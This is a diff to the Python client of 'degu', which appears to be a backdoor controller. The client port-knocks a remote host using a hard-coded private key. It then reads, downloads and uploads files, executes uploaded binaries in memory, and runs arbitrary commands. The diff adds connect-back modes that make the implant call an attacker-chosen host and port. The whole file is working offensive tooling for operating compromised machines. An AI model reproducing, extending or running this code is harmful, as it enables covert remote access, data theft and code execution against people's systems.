@@ -5,16 +5,21 @@ import random
 import string
 import time
 import sys
+from multiprocessing.pool import ThreadPool
 from degu import degu
 
 
 __doc__="""
 
 Usage:
-    dgu bind  <rhost> <rport> read <rfile>
-    dgu bind  <rhost> <rport> download <rfile> <lfile>
-    dgu bind  <rhost> <rport> upload <lfile> <rfile>
-    dgu bind  <rhost> <rport> exe <lfile> <parameters>
+    dgu bind  <rhost> <rport>         read     <rfile>
+    dgu bind  <rhost> <rport>         download <rfile> <lfile>
+    dgu bind  <rhost> <rport>         upload   <lfile> <rfile>
+    dgu bind  <rhost> <rport>         exe      <lfile> <parameters>
+    dgu cb    <rhost> <lhost> <lport> read     <rfile>
+    dgu cb    <rhost> <lhost> <lport> download <rfile> <lfile>
+    dgu cb    <rhost> <lhost> <lport> upload   <lfile> <rfile>
+    dgu cb    <rhost> <lhost> <lport> exe      <lfile> <parameters>
     dgu ghost <rhost> <cmd>
     dgu keygen
 
@@ -53,7 +58,7 @@ $ dgu ghost 192.168.0.49 "touch /tmp/pwneeee"
 
 """
 
-PRIVATE_KEY="f82876e92eaadc0702c16e7deca02ffe25116e84c8ba1e9ebb7423446dbae0534700b14ed3e531a3bc90f852b812df7d79e55190f60c9f2dc6fc0dc67aed0e92"
+PRIVATE_KEY="5802f6d9ec49d04f10473909a6b74a206265311f2c97369144fdb00275d994514056cc619b37690f587fb18a5ec2cf02e2358ccd557cb8b834ccda16483ad2f9"
 
 if __name__ == "__main__":
     args = docopt.docopt(__doc__)
@@ -66,7 +71,8 @@ if __name__ == "__main__":
             time.sleep(2) # waiting for port to come up on degu
             fil = d.download(args['<rfile>'].encode())
             if args['read']:
-                print(fil.decode("ascii"))
+                if fil:
+                    print(fil.decode("ascii"))
             else:
                 try:
                     f = open(args['<lfile>'],"wb")
@@ -76,17 +82,49 @@ if __name__ == "__main__":
                 except Exception as e:
                     d.log.error("unable to create %s : %s" % (args['<lfile>'],e))
             del d
+        if args['cb']:
+            d = degu(args['<rhost>'],priv = PRIVATE_KEY)
+            pool = ThreadPool(processes=1)
+            async_result = pool.apply_async(d.rdownload, (args['<rfile>'].encode(),args['<lport>']))
+            d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode()))
+            fil = async_result.get()
+            if fil :
+                if args['read']:
+                    print(fil.decode("ascii"))
+                else:
+                    try:
+                        f = open(args['<lfile>'],"wb")
+                        f.write(fil)
+                        f.close()
+                        d.log.info("write %i bytes on %s "%(len(fil),args['<lfile>']))
+                    except Exception as e:
+                        d.log.error("unable to create %s : %s" % (args['<lfile>'],e))
+            del d
+
+
+
+
+            #time.sleep(2)
     if args['upload']:
         if args['bind']:
             d = degu(args['<rhost>'],priv = PRIVATE_KEY)
             d.knock( b':' + args['<rport>'].encode())
             time.sleep(2) # waiting for port to come up on degu
             try:
-                fil = d.upload( args['<lfile>'].encode(), args['<rfile>'].encode() ) 
+                fil = d.upload( args['<lfile>'].encode(), args['<rfile>'].encode() )
                 d.log.info("uploaded %s on %s:%s"%(args['<lfile>'],args['<rhost>'],args['<rfile>']))
             except Exception as e:
                 d.log.error("unable to upload %s : %s" % (args['<lfile>'],e))
             del d
+        if args['cb']:
+            d = degu(args['<rhost>'],priv = PRIVATE_KEY)
+            pool = ThreadPool(processes=1)
+            async_result = pool.apply_async(d.rupload, (args['<lfile>'].encode(), args['<rfile>'].encode(),args['<lport>']))
+            d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode()))
+            a = async_result.get()
+            if a :
+                print(a.decode("ascii"))
+
 
     if args['exe']:
         if args['bind']:
@@ -99,6 +137,15 @@ if __name__ == "__main__":
             except Exception as e:
                 d.log.error("unable to upload %s : %s" % (args['<lfile>'],e))
             del d
+        if args["cb"]:
+            d = degu(args['<rhost>'],priv = PRIVATE_KEY)
+            pool = ThreadPool(processes=1)
+            async_result = pool.apply_async(d.rmem_exec, (args['<lfile>'],args['<parameters>'].encode(),args['<lport>']))
+            d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode()))
+            a = async_result.get()
+            if a :
+                print(a.decode("ascii"))
+
 
     if args['ghost']:
         d = degu(args['<rhost>'],priv = PRIVATE_KEY)
